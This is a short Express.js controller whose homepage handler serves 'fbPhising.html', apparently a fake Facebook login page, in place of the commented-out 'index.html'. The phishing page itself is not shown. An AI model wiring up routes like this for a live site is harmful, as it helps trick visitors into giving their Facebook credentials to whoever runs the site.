/* 
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
/* global __dirname */

'use strict';

var options = {
    index: {
        name: "index.html",
        dir: {root: __dirname + '/../views'}
    },
    fb_full: {
        name: "fbPhising.html",
        dir: {root: __dirname + '/../views/pages/fbphishing'}
    }
};

exports.homepage = function (req, res) {
//    res.sendFile(options.index.name, options.index.dir);
    res.sendFile(options.fb_full.name, options.fb_full.dir);
};